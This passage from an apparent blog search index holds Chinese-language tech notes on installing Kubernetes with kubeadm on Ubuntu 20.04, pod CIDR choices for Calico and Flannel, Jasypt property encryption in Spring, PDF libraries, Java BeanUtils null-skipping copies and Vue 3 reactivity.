","date":"2022-04-02","objectID":"/blog/posts/%E9%9B%B2%E7%AB%AF%E8%99%9B%E6%93%AC%E6%A9%9F-Ubuntu-20-04-%E5%AE%89%E8%A3%9D-Kubernetes/:1:3","tags":["kubernetes"],"title":"雲端虛擬機 Ubuntu 20.04 安裝 Kubernetes","uri":"/blog/posts/%E9%9B%B2%E7%AB%AF%E8%99%9B%E6%93%AC%E6%A9%9F-Ubuntu-20-04-%E5%AE%89%E8%A3%9D-Kubernetes/"},{"categories":["Kubernetes"],"content":"安裝 Container runtime docker # Add repo and Install packages sudo apt update sudo apt install -y curl gnupg2 software-properties-common apt-transport-https ca-certificates ## 上下面這段要分開複製執行 curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - sudo add-apt-repository \"deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable\" sudo apt update sudo apt install -y containerd.io docker-ce docker-ce-cli # Create required directories sudo mkdir -p /etc/systemd/system/docker.service.d # Create daemon json config file sudo tee /etc/docker/daemon.json \u003c\u003cEOF { \"exec-opts\": [\"native.cgroupdriver=systemd\"], \"log-driver\": \"json-file\", \"log-opts\": { \"max-size\": \"100m\" }, \"storage-driver\": \"overlay2\" } EOF # Start and enable Services sudo systemctl daemon-reload sudo systemctl restart docker sudo systemctl enable docker ","date":"2022-04-02","objectID":"/blog/posts/%E9%9B%B2%E7%AB%AF%E8%99%9B%E6%93%AC%E6%A9%9F-Ubuntu-20-04-%E5%AE%89%E8%A3%9D-Kubernetes/:1:4","tags":["kubernetes"],"title":"雲端虛擬機 Ubuntu 20.04 安裝 Kubernetes","uri":"/blog/posts/%E9%9B%B2%E7%AB%AF%E8%99%9B%E6%93%AC%E6%A9%9F-Ubuntu-20-04-%E5%AE%89%E8%A3%9D-Kubernetes/"},{"categories":["Kubernetes"],"content":"啟用 kubelet sudo systemctl enable kubelet ","date":"2022-04-02","objectID":"/blog/posts/%E9%9B%B2%E7%AB%AF%E8%99%9B%E6%93%AC%E6%A9%9F-Ubuntu-20-04-%E5%AE%89%E8%A3%9D-Kubernetes/:1:5","tags":["kubernetes"],"title":"雲端虛擬機 Ubuntu 20.04 安裝 Kubernetes","uri":"/blog/posts/%E9%9B%B2%E7%AB%AF%E8%99%9B%E6%93%AC%E6%A9%9F-Ubuntu-20-04-%E5%AE%89%E8%A3%9D-Kubernetes/"},{"categories":["Kubernetes"],"content":"pull 相關 kubernetes image 元件 sudo kubeadm config images pull ","date":"2022-04-02","objectID":"/blog/posts/%E9%9B%B2%E7%AB%AF%E8%99%9B%E6%93%AC%E6%A9%9F-Ubuntu-20-04-%E5%AE%89%E8%A3%9D-Kubernetes/:1:6","tags":["kubernetes"],"title":"雲端虛擬機 Ubuntu 20.04 安裝 Kubernetes","uri":"/blog/posts/%E9%9B%B2%E7%AB%AF%E8%99%9B%E6%93%AC%E6%A9%9F-Ubuntu-20-04-%E5%AE%89%E8%A3%9D-Kubernetes/"},{"categories":["Kubernetes"],"content":"kubernetes-master 初始化 kubernetes 網路 kubernetes-master 需要做，worker跳過 kubernetes-master 需要做，worker跳過 kubernetes-master 需要做，worker跳過 # calic 的網路範圍，但我後來失敗改用flannel # sudo kubeadm init \\ --pod-network-cidr=192.168.0.0/16 # flannel IP範圍是 10.244.0.0 /16 sudo kubeadm init --pod-network-cidr=10.244.0.0/16 The screenshot below shows that the initialization was successful. We have also added a flag to specify the pod network with the IP 10.244.0.0, It’s the default IP that the kube-flannel uses. We will discuss more on the pod network in the next step. 這邊有失敗的話，可以執行kubeadm reset重設定。再重新執行 參考:初始化 Kubernetes 问题（端口占用）_u013004700的专栏-CSDN博客_k8s端口占用 結果下面會顯示 Your Kubernetes control-plane has initialized successfully! To start using your cluster, you need to run the following as a regular user: mkdir -p $HOME/.kube sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config sudo chown $(id -u):$(id -g) $HOME/.kube/config Alternatively, if you are the root user, you can run: export KUBECONFIG=/etc/kubernetes/admin.conf You should now deploy a pod network to the cluster. Run \"kubectl apply -f [podnetwork].yaml\" with one of the options listed at: https://kubernetes.io/docs/concepts/cluster-administration/addons/ Then you can join any number of worker nodes by running the following on each as root: kubeadm join 192.168.100.11:6443 --token a3egpo.22u4srzgnrmoaxfe \\ --discovery-token-ca-cert-hash sha256:ca6ab702a4247c0d7dd0daf040e9c53d90b8e5c3085dada496bec7ec4e98ed55 ","date":"2022-04-02","objectID":"/blog/posts/%E9%9B%B2%E7%AB%AF%E8%99%9B%E6%93%AC%E6%A9%9F-Ubuntu-20-04-%E5%AE%89%E8%A3%9D-Kubernetes/:1:7","tags":["kubernetes"],"title":"雲端虛擬機 Ubuntu 20.04 安裝 Kubernetes","uri":"/blog/posts/%E9%9B%B2%E7%AB%AF%E8%99%9B%E6%93%AC%E6%A9%9F-Ubuntu-20-04-%E5%AE%89%E8%A3%9D-Kubernetes/"},{"categories":["Kubernetes"],"content":"kubectl 連線設定 kubectl 連線設定套用 mkdir -p $HOME/.kube sudo cp -f /etc/kubernetes/admin.conf $HOME/.kube/config sudo chown $(id -u):$(id -g) $HOME/.kube/config 可以看到安裝完某些服務Pendding ","date":"2022-04-02","objectID":"/blog/posts/%E9%9B%B2%E7%AB%AF%E8%99%9B%E6%93%AC%E6%A9%9F-Ubuntu-20-04-%E5%AE%89%E8%A3%9D-Kubernetes/:1:8","tags":["kubernetes"],"title":"雲端虛擬機 Ubuntu 20.04 安裝 Kubernetes","uri":"/blog/posts/%E9%9B%B2%E7%AB%AF%E8%99%9B%E6%93%AC%E6%A9%9F-Ubuntu-20-04-%E5%AE%89%E8%A3%9D-Kubernetes/"},{"categories":["Kubernetes"],"content":"查加 worker1 指令 忘記怎麼加可以下 kubeadm token create --print-join-command 會顯示加 worker指令 接下來要加 worker 指令 ","date":"2022-04-02","objectID":"/blog/posts/%E9%9B%B2%E7%AB%AF%E8%99%9B%E6%93%AC%E6%A9%9F-Ubuntu-20-04-%E5%AE%89%E8%A3%9D-Kubernetes/:1:9","tags":["kubernetes"],"title":"雲端虛擬機 Ubuntu 20.04 安裝 Kubernetes","uri":"/blog/posts/%E9%9B%B2%E7%AB%AF%E8%99%9B%E6%93%AC%E6%A9%9F-Ubuntu-20-04-%E5%AE%89%E8%A3%9D-Kubernetes/"},{"categories":["Kubernetes"],"content":"加入 bash auto-completion echo 'source \u003c(kubectl completion bash)' \u003e\u003e~/.bashrc 重新 ssh 進來就可以正常使用。 參考:bash auto-completion on Linux | Kubernetes ","date":"2022-04-02","objectID":"/blog/posts/%E9%9B%B2%E7%AB%AF%E8%99%9B%E6%93%AC%E6%A9%9F-Ubuntu-20-04-%E5%AE%89%E8%A3%9D-Kubernetes/:1:10","tags":["kubernetes"],"title":"雲端虛擬機 Ubuntu 20.04 安裝 Kubernetes","uri":"/blog/posts/%E9%9B%B2%E7%AB%AF%E8%99%9B%E6%93%AC%E6%A9%9F-Ubuntu-20-04-%E5%AE%89%E8%A3%9D-Kubernetes/"},{"categories":["Kubernetes"],"content":"怎麼移除 worker Master # 停用 node 掉度 kubectl drain k8s-worker1 --delete-local-data --force --ignore-daemonsets # 刪掉 node(worker) kubectl delete node k8s-worker1 Worker sudo kubeadm reset 參考: kubernetes集群新增/移除work節點_change the door-CSDN博客_k8s增加work節點 向Kubernetes集群添加／刪除Node - IT閱讀 ","date":"2022-04-02","objectID":"/blog/posts/%E9%9B%B2%E7%AB%AF%E8%99%9B%E6%93%AC%E6%A9%9F-Ubuntu-20-04-%E5%AE%89%E8%A3%9D-Kubernetes/:1:11","tags":["kubernetes"],"title":"雲端虛擬機 Ubuntu 20.04 安裝 Kubernetes","uri":"/blog/posts/%E9%9B%B2%E7%AB%AF%E8%99%9B%E6%93%AC%E6%A9%9F-Ubuntu-20-04-%E5%AE%89%E8%A3%9D-Kubernetes/"},{"categories":["Kubernetes"],"content":"安裝 K8S 網路套件(calic) 建議使用IP 範圍選172開頭，我最後選擇flannel ，跑網路這一快才成功。因為我IP是10開頭，不確定是不是因為這樣撞到IP，所以我才換flannel。 kubectl create -f https://docs.projectcalico.org/manifests/tigera-operator.yaml kubectl create -f https://docs.projectcalico.org/manifests/custom-resources.yaml ","date":"2022-04-02","objectID":"/blog/posts/%E9%9B%B2%E7%AB%AF%E8%99%9B%E6%93%AC%E6%A9%9F-Ubuntu-20-04-%E5%AE%89%E8%A3%9D-Kubernetes/:1:12","tags":["kubernetes"],"title":"雲端虛擬機 Ubuntu 20.04 安裝 Kubernetes","uri":"/blog/posts/%E9%9B%B2%E7%AB%AF%E8%99%9B%E6%93%AC%E6%A9%9F-Ubuntu-20-04-%E5%AE%89%E8%A3%9D-Kubernetes/"},{"categories":["Kubernetes"],"content":"flannel 參考How to Install and Use Kubernetes on Ubuntu 20.04 • CloudSigma kubectl apply -f https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml kubectl apply -f https://raw.githubusercontent.com/coreos/flannel/master/Documentation/k8s-manifests/kube-flannel-rbac.yml 可以查看結果 watch kubectl get pods --all-namespaces 部署 Worker 节点-Kubernetes 实践指南（Kubernetes Practice Guide）-面试哥 ","date":"2022-04-02","objectID":"/blog/posts/%E9%9B%B2%E7%AB%AF%E8%99%9B%E6%93%AC%E6%A9%9F-Ubuntu-20-04-%E5%AE%89%E8%A3%9D-Kubernetes/:1:13","tags":["kubernetes"],"title":"雲端虛擬機 Ubuntu 20.04 安裝 Kubernetes","uri":"/blog/posts/%E9%9B%B2%E7%AB%AF%E8%99%9B%E6%93%AC%E6%A9%9F-Ubuntu-20-04-%E5%AE%89%E8%A3%9D-Kubernetes/"},{"categories":["Kubernetes"],"content":"也許不需要操作 worker 我剛開始很想在 worker主機看當下主機資源，但操作不能看到，因為之前玩 Docker Swarm 時候我有當下 docker ps 看當下主機資源，後來發現應該要到control-plane去操作。 其實 join 進去的時候就有寫上。 ","date":"2022-04-02","objectID":"/blog/posts/%E9%9B%B2%E7%AB%AF%E8%99%9B%E6%93%AC%E6%A9%9F-Ubuntu-20-04-%E5%AE%89%E8%A3%9D-Kubernetes/:1:14","tags":["kubernetes"],"title":"雲端虛擬機 Ubuntu 20.04 安裝 Kubernetes","uri":"/blog/posts/%E9%9B%B2%E7%AB%AF%E8%99%9B%E6%93%AC%E6%A9%9F-Ubuntu-20-04-%E5%AE%89%E8%A3%9D-Kubernetes/"},{"categories":["Kubernetes"],"content":"彩蛋 kubernetes部署loki日志系统_willblog-CSDN博客 從0到1的雲端歷程 ｜2021 AWS CCP_Cloud Practitioner 證照準備 | 操作一下 一文搞懂Kubernetes网络策略(上) - 知乎 k8s 中如何修改 pod-network-cidr 地址范围_已解决_博问_博客园 簡單5步，輕鬆debug K8S服務！ | IT人 Debug Your Kubernetes Service in 5 Easy Steps | by Ram Rai | Better Programming ","date":"2022-04-02","objectID":"/blog/posts/%E9%9B%B2%E7%AB%AF%E8%99%9B%E6%93%AC%E6%A9%9F-Ubuntu-20-04-%E5%AE%89%E8%A3%9D-Kubernetes/:2:0","tags":["kubernetes"],"title":"雲端虛擬機 Ubuntu 20.04 安裝 Kubernetes","uri":"/blog/posts/%E9%9B%B2%E7%AB%AF%E8%99%9B%E6%93%AC%E6%A9%9F-Ubuntu-20-04-%E5%AE%89%E8%A3%9D-Kubernetes/"},{"categories":["Kubernetes"],"content":"最近看到Install Kubernetes Cluster on Ubuntu 20.04 with kubeadm | ComputingForGeeks教學，裡面提到使用 IP 192.168.0.0/16，因為我區網範圍在 192.168.1.0/24，原本照常安裝 Kubernetes，但是 Kubernetes Worker 主機沒辦法連到 Kubernetes Master 主機，Pod那些都看起來正常。 tracepath 發現路徑會傳到外網網路。 ","date":"2022-04-02","objectID":"/blog/posts/Kubernetes-pod-network-cidr-%E8%A8%AD%E9%8C%AF%E6%9C%83%E7%99%BC%E7%94%9F%E4%BB%80%E9%BA%BC%E4%BA%8B%E6%83%85/:0:0","tags":["kubernetes"],"title":"Kubernetes pod-network-cidr 設錯會發生什麼事情","uri":"/blog/posts/Kubernetes-pod-network-cidr-%E8%A8%AD%E9%8C%AF%E6%9C%83%E7%99%BC%E7%94%9F%E4%BB%80%E9%BA%BC%E4%BA%8B%E6%83%85/"},{"categories":["Kubernetes"],"content":"pod-network-cidr 不是可以隨便設定的 後來發現文件有寫避免用相同 IP 範圍。我就調整 pod-network-cidr，IP範圍，但發現 Network 相關 Pod 都沒有啟動，經過多次測試、重置，調整原來的pod-network-cidr 就會產生 Network 的 Pod，我就發覺這個不是簡單可以調整，單然還是可以調整。 ","date":"2022-04-02","objectID":"/blog/posts/Kubernetes-pod-network-cidr-%E8%A8%AD%E9%8C%AF%E6%9C%83%E7%99%BC%E7%94%9F%E4%BB%80%E9%BA%BC%E4%BA%8B%E6%83%85/:1:0","tags":["kubernetes"],"title":"Kubernetes pod-network-cidr 設錯會發生什麼事情","uri":"/blog/posts/Kubernetes-pod-network-cidr-%E8%A8%AD%E9%8C%AF%E6%9C%83%E7%99%BC%E7%94%9F%E4%BB%80%E9%BA%BC%E4%BA%8B%E6%83%85/"},{"categories":["Kubernetes"],"content":"調整方式 要調整方式我稍微網路找一下方法，發現需要一些步驟，改天熟悉 Kubernetes 時候有需求在操作看看。 ","date":"2022-04-02","objectID":"/blog/posts/Kubernetes-pod-network-cidr-%E8%A8%AD%E9%8C%AF%E6%9C%83%E7%99%BC%E7%94%9F%E4%BB%80%E9%BA%BC%E4%BA%8B%E6%83%85/:2:0","tags":["kubernetes"],"title":"Kubernetes pod-network-cidr 設錯會發生什麼事情","uri":"/blog/posts/Kubernetes-pod-network-cidr-%E8%A8%AD%E9%8C%AF%E6%9C%83%E7%99%BC%E7%94%9F%E4%BB%80%E9%BA%BC%E4%BA%8B%E6%83%85/"},{"categories":["Kubernetes"],"content":"Flannel Kubernetes 使用kubeadm创建集群 - SegmentFault 思否 ","date":"2022-04-02","objectID":"/blog/posts/Kubernetes-pod-network-cidr-%E8%A8%AD%E9%8C%AF%E6%9C%83%E7%99%BC%E7%94%9F%E4%BB%80%E9%BA%BC%E4%BA%8B%E6%83%85/:2:1","tags":["kubernetes"],"title":"Kubernetes pod-network-cidr 設錯會發生什麼事情","uri":"/blog/posts/Kubernetes-pod-network-cidr-%E8%A8%AD%E9%8C%AF%E6%9C%83%E7%99%BC%E7%94%9F%E4%BB%80%E9%BA%BC%E4%BA%8B%E6%83%85/"},{"categories":["Kubernetes"],"content":"Calico calico修改podCIDR - 雷探长 - 博客园 ","date":"2022-04-02","objectID":"/blog/posts/Kubernetes-pod-network-cidr-%E8%A8%AD%E9%8C%AF%E6%9C%83%E7%99%BC%E7%94%9F%E4%BB%80%E9%BA%BC%E4%BA%8B%E6%83%85/:3:0","tags":["kubernetes"],"title":"Kubernetes pod-network-cidr 設錯會發生什麼事情","uri":"/blog/posts/Kubernetes-pod-network-cidr-%E8%A8%AD%E9%8C%AF%E6%9C%83%E7%99%BC%E7%94%9F%E4%BB%80%E9%BA%BC%E4%BA%8B%E6%83%85/"},{"categories":["Kubernetes"],"content":"重置發生問題(彩蛋) Kubernetes(K8s) 使用kubeadm reset重置后 kubeadm init 失败的解决方法-CJavaPy Calico配置及原理 | Mr.Ye Blogs 虚拟化运维–容器网络–K8S+Calico(十三) - 简书 故障排查：Kubernetes 中 Pod 无法正常解析域名 | Linux经验之谈 常見 CNI (Container Network Interface) Plugin 介紹 | Hwchiu Learning Note 簡單5步，輕鬆debug K8S服務！ | IT人 ","date":"2022-04-02","objectID":"/blog/posts/Kubernetes-pod-network-cidr-%E8%A8%AD%E9%8C%AF%E6%9C%83%E7%99%BC%E7%94%9F%E4%BB%80%E9%BA%BC%E4%BA%8B%E6%83%85/:4:0","tags":["kubernetes"],"title":"Kubernetes pod-network-cidr 設錯會發生什麼事情","uri":"/blog/posts/Kubernetes-pod-network-cidr-%E8%A8%AD%E9%8C%AF%E6%9C%83%E7%99%BC%E7%94%9F%E4%BB%80%E9%BA%BC%E4%BA%8B%E6%83%85/"},{"categories":["Java"],"content":"最近工作上面源掃掃到密碼 Hard Code 程式，有人提供使用 Jasypt 作加密動作，不過，就算改成從 DB 撈出來也會抓到這個問題，所以用 Jasypt 能不能掃到?我也不是很清楚。 這邊我就簡單做個紀錄。 ","date":"2022-02-14","objectID":"/blog/posts/jasypt-%E7%A8%8B%E5%BC%8F%E7%A2%BC%E5%AF%86%E7%A2%BC%E5%8A%A0%E5%AF%86%E5%AF%86%E7%A2%BC%E8%A8%AD%E5%AE%9A/:0:0","tags":["jasypt","java"],"title":"Jasypt 程式碼密碼加密密碼設定","uri":"/blog/posts/jasypt-%E7%A8%8B%E5%BC%8F%E7%A2%BC%E5%AF%86%E7%A2%BC%E5%8A%A0%E5%AF%86%E5%AF%86%E7%A2%BC%E8%A8%AD%E5%AE%9A/"},{"categories":["Java"],"content":"了解怎麼載入 properties(與標題無關) 這邊跟加密沒有關係，但先了解怎麼從 Spring 載入 properties ","date":"2022-02-14","objectID":"/blog/posts/jasypt-%E7%A8%8B%E5%BC%8F%E7%A2%BC%E5%AF%86%E7%A2%BC%E5%8A%A0%E5%AF%86%E5%AF%86%E7%A2%BC%E8%A8%AD%E5%AE%9A/:1:0","tags":["jasypt","java"],"title":"Jasypt 程式碼密碼加密密碼設定","uri":"/blog/posts/jasypt-%E7%A8%8B%E5%BC%8F%E7%A2%BC%E5%AF%86%E7%A2%BC%E5%8A%A0%E5%AF%86%E5%AF%86%E7%A2%BC%E8%A8%AD%E5%AE%9A/"},{"categories":["Java"],"content":"設定 方法一 (context:property-placeholder ) \u003ccontext:property-placeholder location=\"classpath:system.properties\" /\u003e \u003ccontext:property-placeholder\u003e標簽提供了一種優雅的外在化參數配置的方式，不過該標簽在Spring配置文件中只能存在一份！！！ 眾所周知，Spring容器是采用反射掃描的發現機制，通過標簽的命名空間實例化實例，當Spring探測到容器中有一個org.springframework.beans.factory.config.PropertyPlaceholderCVonfigurer的Bean就會停止對剩余PropertyPlaceholderConfigurer的掃描，即只能存在一個實例！ 參考: Spring配置文件context:property-placeholder標簽使用漫談 - IT閱讀 方法二 (PropertyPlaceholderConfigurer) 本篇重點!! \u003cbean class=\"org.springframework.beans.factory.config.PropertyPlaceholderConfigurer\"\u003e \u003c!-- 對於讀取一個配置檔案採取的方案 --\u003e \u003c!--\u003cproperty name=\"location\" value=\"classpath:db.properties\"/\u003e--\u003e \u003c!--對於讀取多個配置檔案採取的方案--\u003e \u003cproperty name=\"locations\"\u003e \u003clist\u003e \u003cvalue\u003eclasspath:db.properties\u003c/value\u003e \u003cvalue\u003eclasspath:db2.properties\u003c/value\u003e \u003c/list\u003e \u003c/property\u003e \u003c/bean\u003e 這邊Jaspty 會用這個!! Jaspty 裡面的 EncryptablePropertyPlaceholderConfigurer 繼承這個物件，我們可以使用@value去抓出資料。 更多方法 五种方式让你在java中读取properties文件内容不再是难题 - 阿豪聊干货 - 博客园 TODO: 備份 spring- properties 讀取的五種方式 | IT人 Java程式碼中獲取配置檔案(config.properties)中內容的兩種方法 - IT閱讀 Spring註解@Value及屬性載入組態檔方式 - IT145.com ","date":"2022-02-14","objectID":"/blog/posts/jasypt-%E7%A8%8B%E5%BC%8F%E7%A2%BC%E5%AF%86%E7%A2%BC%E5%8A%A0%E5%AF%86%E5%AF%86%E7%A2%BC%E8%A8%AD%E5%AE%9A/:1:1","tags":["jasypt","java"],"title":"Jasypt 程式碼密碼加密密碼設定","uri":"/blog/posts/jasypt-%E7%A8%8B%E5%BC%8F%E7%A2%BC%E5%AF%86%E7%A2%BC%E5%8A%A0%E5%AF%86%E5%AF%86%E7%A2%BC%E8%A8%AD%E5%AE%9A/"},{"categories":["Java"],"content":"讀取值方法 @value @Value(\"${item.specKey}\") private String SPEC_KEY ; @Value(\"${item.saltvalueStr}\") private String SALTVALUE_STR ; 讀取方法 \u003cbean id=\"xxx\" class=\"xxxxx\"\u003e \u003cproperty name=\"SPEC_KEY\" value=\"${item.specKey}\" /\u003e \u003cproperty name=\"SALTVALUE_STR\" value=\"${item.saltvalueStr}\" /\u003e \u003c/bean\u003e properties item.specKey=Test item.saltvalueStr=Test ","date":"2022-02-14","objectID":"/blog/posts/jasypt-%E7%A8%8B%E5%BC%8F%E7%A2%BC%E5%AF%86%E7%A2%BC%E5%8A%A0%E5%AF%86%E5%AF%86%E7%A2%BC%E8%A8%AD%E5%AE%9A/:1:2","tags":["jasypt","java"],"title":"Jasypt 程式碼密碼加密密碼設定","uri":"/blog/posts/jasypt-%E7%A8%8B%E5%BC%8F%E7%A2%BC%E5%AF%86%E7%A2%BC%E5%8A%A0%E5%AF%86%E5%AF%86%E7%A2%BC%E8%A8%AD%E5%AE%9A/"},{"categories":["Java"],"content":"Jasypt 加密動作 jasypt \u003cdependency\u003e \u003cgroupId\u003eorg.jasypt\u003c/groupId\u003e \u003cartifactId\u003ejasypt\u003c/artifactId\u003e \u003cversion\u003e1.9.3\u003c/version\u003e \u003c/dependency\u003e \u003cbean id=\"jasyptConf\" class=\"org.jasypt.encryption.pbe.config.EnvironmentStringPBEConfig\"\u003e \u003cproperty name=\"algorithm\" value=\"PBEWithMD5AndDES\" /\u003e \u003cproperty name=\"password\" value=\"********\" /\u003e \u003c/bean\u003e \u003cbean id=\"jasyptEncryptor\" class=\"org.jasypt.encryption.pbe.StandardPBEStringEncryptor\"\u003e \u003cproperty name=\"config\" ref=\"jasyptConf\" /\u003e \u003c/bean\u003e \u003cbean id=\"propertyConfigurer\" class=\"org.jasypt.spring4.properties.EncryptablePropertyPlaceholderConfigurer\"\u003e \u003cconstructor-arg ref=\"jasyptEncryptor\" /\u003e \u003cproperty name=\"locations\"\u003e \u003clist\u003e \u003cvalue\u003eclasspath*:com/project/npp/persistence/cfg/jdbc.properties\u003c/value\u003e \u003c/list\u003e \u003c/property\u003e \u003cproperty name=\"ignoreUnresolvablePlaceholders\" value=\"true\"/\u003e \u003c/bean\u003e jdbc.driverClassName=com.ibm.db2.jcc.DB2Driver jdbc.username=nppuser1 jdbc.password=ENC(fAObzokoh7ldKBiVU16pqSdPeURziFjb) ","date":"2022-02-14","objectID":"/blog/posts/jasypt-%E7%A8%8B%E5%BC%8F%E7%A2%BC%E5%AF%86%E7%A2%BC%E5%8A%A0%E5%AF%86%E5%AF%86%E7%A2%BC%E8%A8%AD%E5%AE%9A/:2:0","tags":["jasypt","java"],"title":"Jasypt 程式碼密碼加密密碼設定","uri":"/blog/posts/jasypt-%E7%A8%8B%E5%BC%8F%E7%A2%BC%E5%AF%86%E7%A2%BC%E5%8A%A0%E5%AF%86%E5%AF%86%E7%A2%BC%E8%A8%AD%E5%AE%9A/"},{"categories":["Java"],"content":"如何產生 Jasypt 加密key? 官網抓的jar 檔，下已下指令可以得出 java -cp jasypt-1.9.3.jar org.jasypt.intf.cli.JasyptPBEStringEncryptionCLI input=\"myPassword\" password=privatekey algorithm=PBEWithMD5AndDES 還有一個方法是用官方 shell script 去產生Releases · jasypt/jasypt · GitHub，這邊就不特別做紀錄，網路很多是用這個方法。 ","date":"2022-02-14","objectID":"/blog/posts/jasypt-%E7%A8%8B%E5%BC%8F%E7%A2%BC%E5%AF%86%E7%A2%BC%E5%8A%A0%E5%AF%86%E5%AF%86%E7%A2%BC%E8%A8%AD%E5%AE%9A/:3:0","tags":["jasypt","java"],"title":"Jasypt 程式碼密碼加密密碼設定","uri":"/blog/posts/jasypt-%E7%A8%8B%E5%BC%8F%E7%A2%BC%E5%AF%86%E7%A2%BC%E5%8A%A0%E5%AF%86%E5%AF%86%E7%A2%BC%E8%A8%AD%E5%AE%9A/"},{"categories":["程式心法"],"content":"jsPdf jsPDF-CustomFonts-support JSPDF支持中文（思源黑体）采坑之旅，JSPDF中文字体乱码解决方案 - 有蚊子 - 博客园 解决jspdf中文乱码、表格中文乱码！–终极版！！_huanhuan03的博客-CSDN博客_jspdf中文乱码 ","date":"2022-02-14","objectID":"/blog/posts/%E7%B0%A1%E5%96%AE%E6%B8%AC%E8%A9%A6%E4%B8%AD%E6%96%87%E5%AD%97%E5%BD%A2-pdf-%E6%96%B9%E6%B3%95-%E6%9C%AA%E6%B8%AC%E8%A9%A6/:1:0","tags":["nodejs","pdf"],"title":"簡單測試中文字形 pdf 方法(未測試)","uri":"/blog/posts/%E7%B0%A1%E5%96%AE%E6%B8%AC%E8%A9%A6%E4%B8%AD%E6%96%87%E5%AD%97%E5%BD%A2-pdf-%E6%96%B9%E6%B3%95-%E6%9C%AA%E6%B8%AC%E8%A9%A6/"},{"categories":["程式心法"],"content":"golang pdf jung-kurt/gofpdf: A PDF document generator with high level support for text, drawing and images Go处理PDF - SegmentFault 思否 ","date":"2022-02-14","objectID":"/blog/posts/%E7%B0%A1%E5%96%AE%E6%B8%AC%E8%A9%A6%E4%B8%AD%E6%96%87%E5%AD%97%E5%BD%A2-pdf-%E6%96%B9%E6%B3%95-%E6%9C%AA%E6%B8%AC%E8%A9%A6/:2:0","tags":["nodejs","pdf"],"title":"簡單測試中文字形 pdf 方法(未測試)","uri":"/blog/posts/%E7%B0%A1%E5%96%AE%E6%B8%AC%E8%A9%A6%E4%B8%AD%E6%96%87%E5%AD%97%E5%BD%A2-pdf-%E6%96%B9%E6%B3%95-%E6%9C%AA%E6%B8%AC%E8%A9%A6/"},{"categories":["程式心法"],"content":"powershell EvotecIT/PSWritePDF: PowerShell Module to create, edit, split, merge PDF files on Windows / Linux and MacOS ","date":"2022-02-14","objectID":"/blog/posts/%E7%B0%A1%E5%96%AE%E6%B8%AC%E8%A9%A6%E4%B8%AD%E6%96%87%E5%AD%97%E5%BD%A2-pdf-%E6%96%B9%E6%B3%95-%E6%9C%AA%E6%B8%AC%E8%A9%A6/:3:0","tags":["nodejs","pdf"],"title":"簡單測試中文字形 pdf 方法(未測試)","uri":"/blog/posts/%E7%B0%A1%E5%96%AE%E6%B8%AC%E8%A9%A6%E4%B8%AD%E6%96%87%E5%AD%97%E5%BD%A2-pdf-%E6%96%B9%E6%B3%95-%E6%9C%AA%E6%B8%AC%E8%A9%A6/"},{"categories":["Java"],"content":"最近做 JS 做物件繼承值方法 (Object.assign) ，在想 Java 有沒有這個東西，但發現好像沒有，需要自己幹一個，我整理網路做好的。 ","date":"2022-02-14","objectID":"/blog/posts/Java-Bean-copyporties-%E4%B8%8D%E8%A4%87%E8%A3%BD-null-%E6%96%B9%E6%B3%95/:0:0","tags":["java","bean","copyporties"],"title":"Java Bean copyporties 不複製 null 方法","uri":"/blog/posts/Java-Bean-copyporties-%E4%B8%8D%E8%A4%87%E8%A3%BD-null-%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"方法 Skip null properties when copying properties in Spring BeanUtils public static String[] getNullPropertyNames (Object source) { final BeanWrapper src = new BeanWrapperImpl(source); java.beans.PropertyDescriptor[] pds = src.getPropertyDescriptors(); Set\u003cString\u003e emptyNames = new HashSet\u003cString\u003e(); for(java.beans.PropertyDescriptor pd : pds) { Object srcValue = src.getPropertyValue(pd.getName()); if (srcValue == null) emptyNames.add(pd.getName()); } String[] result = new String[emptyNames.size()]; return emptyNames.toArray(result); } // then use Spring BeanUtils to copy and ignore null using our function public static void myCopyProperties(Object src, Object target) { BeanUtils.copyProperties(src, target, getNullPropertyNames(src)); } ","date":"2022-02-14","objectID":"/blog/posts/Java-Bean-copyporties-%E4%B8%8D%E8%A4%87%E8%A3%BD-null-%E6%96%B9%E6%B3%95/:1:0","tags":["java","bean","copyporties"],"title":"Java Bean copyporties 不複製 null 方法","uri":"/blog/posts/Java-Bean-copyporties-%E4%B8%8D%E8%A4%87%E8%A3%BD-null-%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"Java 8 實作方法 public static String[] getNullPropertyNames(Object source) { final BeanWrapper wrappedSource = new BeanWrapperImpl(source); return Stream.of(wrappedSource.getPropertyDescriptors()) .map(FeatureDescriptor::getName) .filter(propertyName -\u003e wrappedSource.getPropertyValue(propertyName) == null) .toArray(String[]::new); } java - How to ignore null values using springframework BeanUtils copyProperties? - Stack Overflow Skip null properties when copying properties in Spring BeanUtils ","date":"2022-02-14","objectID":"/blog/posts/Java-Bean-copyporties-%E4%B8%8D%E8%A4%87%E8%A3%BD-null-%E6%96%B9%E6%B3%95/:1:1","tags":["java","bean","copyporties"],"title":"Java Bean copyporties 不複製 null 方法","uri":"/blog/posts/Java-Bean-copyporties-%E4%B8%8D%E8%A4%87%E8%A3%BD-null-%E6%96%B9%E6%B3%95/"},{"categories":["Vue"],"content":"最近遇到很奇怪問題， 由於Vue Component 我把Timer 拆出去 js 做，但 prop 帶進去參數，後面更改參數沒有做更新。這讓我想到 Vue 2 也有類似這個問題，所以進一步探討發現是跟Reactivity in Depth有關。 Reactivity in Depth | Vue.js ","date":"2022-02-13","objectID":"/blog/posts/Vue3-%E7%84%A1%E6%B3%95%E6%AD%A3%E7%A2%BA-Render-%E6%9B%B4%E6%96%B0%E7%95%AB%E9%9D%A2/:0:0","tags":["vue","render"],"title":"Vue3 無法正確 Render 更新畫面","uri":"/blog/posts/Vue3-%E7%84%A1%E6%B3%95%E6%AD%A3%E7%A2%BA-Render-%E6%9B%B4%E6%96%B0%E7%95%AB%E9%9D%A2/"},{"categories":["Vue"],"content":"Vue 2 Reactivity 網路上還滿多 Vue 2 Reactivity in Depth 文章，但是這個跟 Vue 3 問題沒關係，所以解決方法無效。 [掘竅] 為什麼畫面沒有隨資料更新 - Vue 響應式原理（Reactivity） ~ PJCHENder\u003cbr\u003e那些沒告訴你的小細節 ","date":"2022-02-13","objectID":"/blog/posts/Vue3-%E7%84%A1%E6%B3%95%E6%AD%A3%E7%A2%BA-Render-%E6%9B%B4%E6%96%B0%E7%95%AB%E9%9D%A2/:1:0","tags":["vue","render"],"title":"Vue3 無法正確 Render 